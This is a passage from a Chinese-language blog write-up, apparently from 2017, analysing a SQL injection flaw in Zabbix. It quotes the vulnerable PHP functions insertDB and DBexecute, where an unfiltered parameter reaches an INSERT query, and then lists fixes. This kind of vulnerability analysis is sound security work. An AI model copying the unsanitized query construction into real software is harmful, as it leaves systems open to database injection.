&#125;</span><br><span class="line">            DBend();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>参数传入下面的<code>insertDB</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private static function insertDB($idx, $value, $type, $idx2) &#123;</span><br><span class="line">        $value_type = self::getFieldByType($type);</span><br><span class="line"></span><br><span class="line">        $values = array(</span><br><span class="line">            &#x27;profileid&#x27; =&gt; get_dbid(&#x27;profiles&#x27;, &#x27;profileid&#x27;),</span><br><span class="line">            &#x27;userid&#x27; =&gt; self::$userDetails[&#x27;userid&#x27;],</span><br><span class="line">            &#x27;idx&#x27; =&gt; zbx_dbstr($idx),</span><br><span class="line">            $value_type =&gt; zbx_dbstr($value),</span><br><span class="line">            &#x27;type&#x27; =&gt; $type,</span><br><span class="line">            &#x27;idx2&#x27; =&gt; $idx2</span><br><span class="line">        );</span><br><span class="line">        return DBexecute(&#x27;INSERT INTO profiles (&#x27;.implode(&#x27;, &#x27;, array_keys($values)).&#x27;) VALUES (&#x27;.implode(&#x27;, &#x27;, $values).&#x27;)&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到第四个参数没有过滤，通过<code>DBexecute</code>被带到了数据库中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function DBexecute($query, $skip_error_messages = 0) &#123;</span><br><span class="line">    global $DB;</span><br><span class="line"></span><br><span class="line">    if (!isset($DB[&#x27;DB&#x27;]) || empty($DB[&#x27;DB&#x27;])) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = false;</span><br><span class="line">    $time_start = microtime(true);</span><br><span class="line"></span><br><span class="line">    $DB[&#x27;EXECUTE_COUNT&#x27;]++;</span><br><span class="line"></span><br><span class="line">    switch ($DB[&#x27;TYPE&#x27;]) &#123;</span><br><span class="line">        case ZBX_DB_MYSQL:</span><br><span class="line">            if (!$result = mysqli_query($DB[&#x27;DB&#x27;], $query)) &#123;</span><br><span class="line">                error(&#x27;Error in query [&#x27;.$query.&#x27;] [&#x27;.mysqli_error($DB[&#x27;DB&#x27;]).&#x27;]&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-漏洞修复"><a href="#0x06-漏洞修复" class="headerlink" title="0x06 漏洞修复"></a>0x06 漏洞修复</h2><ul>
+<li>版本升级</li>
+<li>打补丁</li>
+<li>关闭guest</li>
+</ul>
+<h2 id="0x07-后记"><a href="#0x07-后记" class="headerlink" title="0x07 后记"></a>0x07 后记</h2><p>这里还有好多东西没有搞懂，毕竟太菜</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：zabbix SQL Inject Vul</li>
+        <li>Post author：langu_xyz</li>
+        <li>Create time：2017-02-18 21:00:00</li>
+        <li>
+            Post link：https://blog.langu.xyz/zabbix SQL Inject Vul/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/CVE-2016-1897-8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CVE-2016-1897/8 - FFMpeg漏洞分析</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/PHPMailer%20%3C%205.2.18%20Remote%20Code%20Execution(CVE-2016-10033)/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">PHPMailer &lt; 5.2.18 Remote Code Execution(CVE-2016-10033)</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-text">0x01 漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%BD%B1%E5%93%8D%E7%A8%8B%E5%BA%A6"><span class="nav-text">0x02 影响程度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="nav-text">0x03 漏洞测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95"><span class="nav-text">0x04 实战测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">0x05 代码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">0x06 漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%90%8E%E8%AE%B0"><span class="nav-text">0x07 后记</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
